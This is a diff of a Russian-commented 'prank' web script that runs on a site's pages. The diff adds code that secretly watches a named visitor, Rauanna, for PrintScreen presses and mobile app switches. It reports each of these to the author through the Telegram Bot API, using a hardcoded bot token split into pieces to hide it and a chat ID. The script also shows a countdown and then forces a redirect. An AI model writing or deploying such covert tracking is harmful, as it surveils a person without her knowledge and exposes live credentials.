@@ -1,16 +1,50 @@
 // prank.js
-// Этот скрипт добавляет таймер и выкидывает обратно на главную
+// Этот скрипт добавляет таймер, отслеживает скриншоты и выкидывает обратно на главную
 
 (function() {
     // Если это ты (Султан) или в ссылке есть ?me, скрипт не срабатывает
     if (localStorage.getItem('is_sultan') === 'true' || window.location.search.includes('me')) return;
 
-    // Ждем, пока загрузится страница
+    // Функция для отправки уведомления в Telegram (своя, так как на других страницах может не быть глобальной)
+    function sendTelegram(text) {
+        const part1 = "8818384063:";
+        const part2 = "AAEEqTup6sgED-gYB_1tm";
+        const part3 = "cQKcXwi-UDE3lQ";
+        const BOT_TOKEN = part1 + part2 + part3;
+        const CHAT_ID = "606061445";
+        
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`).catch(() => {});
+    }
+
+    // --- 1. ОТСЛЕЖИВАНИЕ СКРИНШОТОВ ---
+    
+    // Для ПК (нажатие PrintScreen)
+    document.addEventListener('keyup', function(event) {
+        if (event.key === 'PrintScreen' || event.keyCode === 44) {
+            sendTelegram(`📸 <b>Внимание!</b>\n\nРауанна сделала скриншот на компьютере.\nСтраница: ${window.location.pathname.split('/').pop()}`);
+        }
+    });
+
+    // Для телефонов (попытка отследить потерю фокуса, когда открывается меню скриншота)
+    let isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    if (isMobile) {
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                // Если страница скрылась, это может быть скриншот, а может быть просто переключение приложения
+                // Отправляем только если она была на странице хотя бы 3 секунды
+                let timeOnPage = (Date.now() - performance.timing.navigationStart) / 1000;
+                if (timeOnPage > 3) {
+                    sendTelegram(`📱 <b>Возможный скриншот!</b>\n\nРауанна свернула браузер (возможно, для скриншота).\nСтраница: ${window.location.pathname.split('/').pop()}`);
+                }
+            }
+        });
+    }
+
+    // --- 2. ЛОГИКА ТАЙМЕРА ---
     window.addEventListener('DOMContentLoaded', () => {
         
-        // 1. Создаем блок с таймером
+        // Создаем блок с таймером
         const timerBox = document.createElement('div');
-        // Стили: фиксированный в правом нижнем углу, прозрачный, не перекрывает клики
         timerBox.style.cssText = `
             position: fixed;
             bottom: 20px;
@@ -26,13 +60,12 @@
             font-size: 14px;
             font-weight: bold;
             z-index: 999999;
-            pointer-events: none; /* Важно: сквозь него можно кликать */
+            pointer-events: none;
             box-shadow: 0 4px 15px rgba(0,0,0,0.5);
             text-align: center;
             transition: 0.3s;
         `;
         
-        // Начальный текст
         timerBox.innerHTML = `
             <div style="font-size: 10px; color: #ff4757; letter-spacing: 1px; margin-bottom: 4px;">СИСТЕМА</div>
             Возврат через: <span id="prankTimer" style="color: #ff4757; font-size: 18px;">10</span> с
@@ -40,7 +73,6 @@
         
         document.body.appendChild(timerBox);
 
-        // 2. Логика обратного отсчета
         let timeLeft = 10;
         const timerSpan = document.getElementById('prankTimer');
 
@@ -50,14 +82,12 @@
             if (timeLeft >= 0 && timerSpan) {
                 timerSpan.textContent = timeLeft;
                 
-                // Когда осталось 3 секунды, начинаем мигать красным
                 if (timeLeft <= 3) {
                     timerBox.style.borderColor = '#ff0000';
                     timerBox.style.background = 'rgba(50, 5, 5, 0.8)';
                 }
             }
 
-            // 3. Когда время вышло - перекидываем
             if (timeLeft < 0) {
                 clearInterval(countdown);
                 window.location.href = 'index.html?error=1';
